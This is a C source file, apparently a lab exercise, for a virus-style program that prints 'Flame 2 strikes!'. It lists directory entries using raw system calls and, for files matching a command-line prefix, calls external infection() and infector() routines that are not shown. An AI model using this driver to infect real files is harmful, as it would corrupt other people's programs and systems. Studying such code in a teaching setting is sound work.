#include "util.h"
#include <stdio.h>
#include <string.h>
#define SYS_WRITE 4
#define STDERR 2
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDONLY  0
#define O_DIRECTORY 0x10000
#define SYS_GETDENTS 141

#define BUFFER_SIZE 8192

extern int system_call();
extern void code_start();
extern void code_end();
extern void infection(void);
extern void infector(char *);

typedef struct dirent {
    int d_ino;      /* inode number */
    int d_off;      /* offset to next dirdirent */
    short d_reclen; /* length of this dirdirent */
    char d_name[];  /* filename */
 } dirent;

dirent* dir = NULL;
char* prefix = NULL;
char type[2];

void debug(int id, int code)
{
  system_call(SYS_WRITE, STDERR, "ID: ", 4);
  system_call(SYS_WRITE, STDERR, itoa(id), strlen(itoa(id)));
  system_call(SYS_WRITE, STDERR, ", return code: ", strlen(", return code: "));
  system_call(SYS_WRITE, STDERR, itoa(code), strlen(itoa(code)));
  if(dir != NULL)
  {
    system_call(SYS_WRITE, STDERR, ", file name: ", 12);
    system_call(SYS_WRITE, STDERR, dir->d_name, strlen(dir->d_name));
    system_call(SYS_WRITE, STDERR, ", length: ", 10);
    system_call(SYS_WRITE, STDERR, itoa(dir->d_reclen), strlen(itoa(dir->d_reclen)));
  }
  if(prefix != NULL)
  {
    system_call(SYS_WRITE, STDERR, ", file type: ", 13);
    system_call(SYS_WRITE, STDERR, type, 1);
  }
  system_call(SYS_WRITE, STDERR, "\n", 2);
}

int main (int argc , char* argv[], char* envp[])
{
  char debugMode = 0;
  int i, root = 0, size;
  char buf[BUFFER_SIZE];
  char* aPrefix = NULL;
  char* str;

  for(i = 1; i < argc; i++)
  {
    if(strcmp(argv[i], "-D") == 0)
      debugMode = 1;
    else if((strncmp(argv[i], "-p", 2) == 0))
      prefix = argv[i] + 2;  
    if (strncmp(argv[i], "-a", 2) == 0)
      aPrefix = argv[i] + 2;
  }
    

  root = system_call(SYS_WRITE, STDOUT, "Flame 2 strikes!\n", 17);
  root = system_call(SYS_WRITE, STDOUT, "code start: ", 12);
  if(debugMode)
    debug(SYS_WRITE, root);
  int address = &code_start;
  str = itoa(address);
  root = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  if(debugMode)
    debug(SYS_WRITE, root);
  root = system_call(SYS_WRITE, STDOUT, ", code end: ", 12);
  if(debugMode)
    debug(SYS_WRITE, root);
  address = &code_end;
  str = itoa(address);
  root = system_call(SYS_WRITE, STDOUT, str, strlen(str));
  if(debugMode)
    debug(SYS_WRITE, root);
  root = system_call(SYS_WRITE, STDOUT, "\n", 2);
  if(debugMode)
    debug(SYS_WRITE, root);


  root = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);

  if(root < 0)
  {
    system_call(SYS_WRITE, STDERR, "error while trying to read DIR\n", 32);
    system_call(SYS_WRITE, 0x55);
  }
  else if(debugMode)
    debug(SYS_OPEN, root);

  size = system_call(SYS_GETDENTS, root, buf, BUFFER_SIZE);
  if(debugMode)
    debug(SYS_GETDENTS, size);

  dir = (dirent*) buf;

  while((int)dir < (int)buf + size)
  {
    if((prefix == NULL) && (aPrefix == NULL) || (prefix != NULL && strncmp(prefix, dir->d_name, strlen(prefix)) == 0))
    {
      int count = system_call(SYS_WRITE, STDOUT, dir->d_name, strlen(dir->d_name));
      system_call(SYS_WRITE, STDERR, "\n", 2);
      if(count < 0)
      {
        system_call(SYS_WRITE, STDERR, "error while to print DIR name\n", 32);
        system_call(SYS_WRITE, 0x55);
      }
      else if(debugMode)
        debug(SYS_WRITE, count);
    }
    if((aPrefix != NULL) && (strncmp(aPrefix, dir->d_name, strlen(aPrefix)) == 0))
    {
      int count = system_call(SYS_WRITE, STDOUT, dir->d_name, strlen(dir->d_name));
      system_call(SYS_WRITE, STDERR, "\n", 2);
      if(count < 0)
      {
        system_call(SYS_WRITE, STDERR, "error while to print DIR name\n", 32);
        system_call(SYS_WRITE, 0x55);
      }
      else if(debugMode)
        debug(SYS_WRITE, count);
      infection();
      infector(dir->d_name);
    }
    dir = (dirent*)(((char*)dir) + dir->d_reclen);
    type[0] = dir->d_name[strlen(dir->d_name) - 1];
  }

  return 0;
}